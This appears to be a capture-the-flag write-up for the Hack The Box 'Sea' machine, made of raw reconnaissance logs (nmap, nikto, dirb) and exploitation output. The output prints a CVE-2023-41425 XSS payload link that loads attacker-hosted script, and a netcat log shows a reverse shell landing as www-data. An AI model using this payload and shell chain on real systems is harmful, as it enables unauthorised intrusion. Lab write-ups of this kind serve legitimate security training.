nmap output:
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-02 23:58 CDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 23:58
Completed NSE at 23:58, 0.00s elapsed
Initiating NSE at 23:58
Completed NSE at 23:58, 0.00s elapsed
Initiating NSE at 23:58
Completed NSE at 23:58, 0.00s elapsed
Initiating Ping Scan at 23:58
Scanning sea.htb (10.129.3.193) [4 ports]
Completed Ping Scan at 23:58, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 23:58
Scanning sea.htb (10.129.3.193) [1000 ports]
Discovered open port 80/tcp on 10.129.3.193
Discovered open port 22/tcp on 10.129.3.193
Completed SYN Stealth Scan at 23:58, 0.21s elapsed (1000 total ports)
Initiating Service scan at 23:58
Scanning 2 services on sea.htb (10.129.3.193)
Completed Service scan at 23:58, 6.05s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against sea.htb (10.129.3.193)
Retrying OS detection (try #2) against sea.htb (10.129.3.193)
Retrying OS detection (try #3) against sea.htb (10.129.3.193)
Retrying OS detection (try #4) against sea.htb (10.129.3.193)
Retrying OS detection (try #5) against sea.htb (10.129.3.193)
Initiating Traceroute at 23:59
Completed Traceroute at 23:59, 0.01s elapsed
Initiating Parallel DNS resolution of 1 host. at 23:59
Completed Parallel DNS resolution of 1 host. at 23:59, 0.00s elapsed
NSE: Script scanning 10.129.3.193.
Initiating NSE at 23:59
Completed NSE at 23:59, 0.44s elapsed
Initiating NSE at 23:59
Completed NSE at 23:59, 0.06s elapsed
Initiating NSE at 23:59
Completed NSE at 23:59, 0.00s elapsed
Nmap scan report for sea.htb (10.129.3.193)
Host is up (0.0088s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Sea - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=10/2%OT=22%CT=1%CU=37392%PV=Y%DS=2%DC=T%G=Y%TM=66FE
OS:2497%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10B%TI=Z%CI=Z%TS=C)SEQ(S
OS:P=100%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST11NW
OS:7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=FE88%
OS:W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CN
OS:NSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=
OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A
OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=4
OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=
OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 30.893 days (since Mon Sep  2 02:33:20 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT     ADDRESS
1   8.65 ms 10.10.14.1
2   8.86 ms sea.htb (10.129.3.193)

NSE: Script Post-scanning.
Initiating NSE at 23:59
Completed NSE at 23:59, 0.00s elapsed
Initiating NSE at 23:59
Completed NSE at 23:59, 0.00s elapsed
Initiating NSE at 23:59
Completed NSE at 23:59, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.52 seconds
           Raw packets sent: 1168 (57.488KB) | Rcvd: 1096 (47.854KB)
```

nikto output:
```bash
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.129.3.193
+ Target Hostname:    sea.htb
+ Target Port:        80
+ Start Time:         2024-10-03 00:00:40 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /home/: This might be interesting.
+ 7962 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2024-10-03 00:02:58 (GMT-5) (138 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

dirb output:
```bash
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: dirb_output.txt
START_TIME: Wed Oct  2 23:59:28 2024
URL_BASE: http://sea.htb/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://sea.htb/ ----
+ http://sea.htb/0 (CODE:200|SIZE:3650)                                                                                                                                                             
+ http://sea.htb/404 (CODE:200|SIZE:3341)                                                                                                                                                           
==> DIRECTORY: http://sea.htb/data/                                                                                                                                                                 
+ http://sea.htb/home (CODE:200|SIZE:3650)                                                                                                                                                          
+ http://sea.htb/index.php (CODE:200|SIZE:3650)                                                                                                                                                     
==> DIRECTORY: http://sea.htb/messages/                                                                                                                                                             
==> DIRECTORY: http://sea.htb/plugins/                                                                                                                                                              
+ http://sea.htb/server-status (CODE:403|SIZE:199)                                                                                                                                                  
==> DIRECTORY: http://sea.htb/themes/                                                                                                                                                               
                                                                                                                                                                                                    
---- Entering directory: http://sea.htb/data/ ----
+ http://sea.htb/data/404 (CODE:200|SIZE:3341)                                                                                                                                                      
==> DIRECTORY: http://sea.htb/data/files/                                                                                                                                                           
+ http://sea.htb/data/home (CODE:200|SIZE:3650)                                                                                                                                                     
                                                                                                                                                                                                    
---- Entering directory: http://sea.htb/messages/ ----
+ http://sea.htb/messages/404 (CODE:200|SIZE:3341)                                                                                                                                                  
+ http://sea.htb/messages/home (CODE:200|SIZE:3650)                                                                                                                                                 
                                                                                                                                                                                                    
---- Entering directory: http://sea.htb/plugins/ ----
+ http://sea.htb/plugins/404 (CODE:200|SIZE:3341)                                                                                                                                                   
+ http://sea.htb/plugins/home (CODE:200|SIZE:3650)                                                                                                                                                  
                                                                                                                                                                                                    
---- Entering directory: http://sea.htb/themes/ ----
+ http://sea.htb/themes/404 (CODE:200|SIZE:3341)                                                                                                                                                    
+ http://sea.htb/themes/home (CODE:200|SIZE:3650)                                                                                                                                                   
                                                                                                                                                                                                    
---- Entering directory: http://sea.htb/data/files/ ----
+ http://sea.htb/data/files/404 (CODE:200|SIZE:3341)                                                                                                                                                
+ http://sea.htb/data/files/home (CODE:200|SIZE:3650)                                                                                                                                               
                                                                                                                                                                                                    
-----------------
END_TIME: Thu Oct  3 00:05:09 2024
DOWNLOADED: 27672 - FOUND: 15
```

![image](https://github.com/user-attachments/assets/2ade61b0-b05b-4312-8ad3-bc6df62e1729)

python3 web server html redirect output:
```bash
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.129.3.193 - - [03/Oct/2024 00:21:38] "GET / HTTP/1.1" 200 -
```

node.js redirect listener output:
```bash
--- Received Data from Admin ---

User-Agent:  Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.0 Safari/537.36 

Cookies:  No cookies found 

Local Storage:
┌─────────┐
│ (index) │
├─────────┤
└─────────┘

Session Storage:
┌─────────┐
│ (index) │
├─────────┤
└─────────┘

Document Data:
┌──────────┬────────────────────────────┐
│ (index)  │           Values           │
├──────────┼────────────────────────────┤
│  title   │           'CTF'            │
│   url    │ 'http://10.10.14.46:4444/' │
│ referrer │             ''             │
│  domain  │       '10.10.14.46'        │
└──────────┴────────────────────────────┘
```

http://sea.htb/themes/bike/LICENSE:
```bash
MIT License

Copyright (c) 2019 turboblack

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

![image](https://github.com/user-attachments/assets/92adef4a-f601-4e94-8e98-4ad7a0350346)

CVE:
https://github.com/insomnia-jacob/CVE-2023-41425

exploit.py output:
```bash
================================================================
        # Autor      : Insomnia (Jacob S.)
        # IG         : insomnia.py
        # X          : @insomniadev_
        # Github     : https://github.com/insomnia-jacob
================================================================          
 
[+]The zip file will be downloaded from the host:    http://10.10.14.46:8000/main.zip
 
[+] File created:  xss.js
 
[+] Set up nc to listen on your terminal for the reverse shell
	Use:
		   nc -nvlp 4321 
 
[+] Send the below link to admin:

	 http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.46:8000/xss.js"></script><form+action=" 

Starting HTTP server with Python3, waiting for the XSS request
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.3.193 - - [03/Oct/2024 23:07:13] "GET /xss.js HTTP/1.1" 200 -
10.129.3.193 - - [03/Oct/2024 23:07:23] "GET /main.zip HTTP/1.1" 200 -
10.129.3.193 - - [03/Oct/2024 23:07:23] "GET /main.zip HTTP/1.1" 200 -
10.129.3.193 - - [03/Oct/2024 23:07:23] "GET /main.zip HTTP/1.1" 200 -
10.129.3.193 - - [03/Oct/2024 23:07:23] "GET /main.zip HTTP/1.1" 200 -
```

netcat output:
```bash
listening on [any] 4321 ...
connect to [10.10.14.46] from (UNKNOWN) [10.129.3.193] 49352
Linux sea 5.4.0-190-generic #210-Ubuntu SMP Fri Jul 5 17:03:38 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 04:07:24 up 23:12,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

$ whoami
www-data

$ pwd
/

$ ls -la
total 72
drwxr-xr-x  19 root root  4096 Feb 21  2024 .
drwxr-xr-x  19 root root  4096 Feb 21  2024 ..
lrwxrwxrwx   1 root root     7 Mar 14  2023 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Aug  1 12:53 boot
drwxr-xr-x  19 root root  4020 Oct  3 04:54 dev
drwxr-xr-x 110 root root  4096 Aug 14 15:27 etc
drwxr-xr-x   4 root root  4096 Jul 30 12:58 home
lrwxrwxrwx   1 root root     7 Mar 14  2023 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Mar 14  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Mar 14  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Mar 14  2023 libx32 -> usr/libx32
drwx------   2 root root 16384 Feb 21  2024 lost+found
drwxr-xr-x   2 root root  4096 Feb 21  2024 media
drwxr-xr-x   2 root root  4096 Mar 14  2023 mnt
drwxr-xr-x   3 root root  4096 Feb 21  2024 opt
dr-xr-xr-x 282 root root     0 Oct  3 04:54 proc
drwx------   7 root root  4096 Oct  3 04:55 root
drwxr-xr-x  28 root root   860 Oct  3 14:52 run
lrwxrwxrwx   1 root root     8 Mar 14  2023 sbin -> usr/sbin
drwxr-xr-x   5 root root  4096 Feb 21  2024 snap
drwxr-xr-x   2 root root  4096 Mar 14  2023 srv
dr-xr-xr-x  13 root root     0 Oct  3 04:54 sys
drwxrwxrwt   2 root root  4096 Oct  4 00:00 tmp
drwxr-xr-x  14 root root  4096 Mar 14  2023 usr
drwxr-xr-x  14 root root  4096 Feb 21  2024 var

$ cd /home
$ ls -la
total 16
drwxr-xr-x  4 root root 4096 Jul 30 12:58 .
drwxr-xr-x 19 root root 4096 Feb 21  2024 ..
drwxr-xr-x  4 amay amay 4096 Aug  1 12:22 amay
drwxr-x---  4 geo  geo  4096 Aug  1 12:13 geo
```

linpeas output:
```bash

```
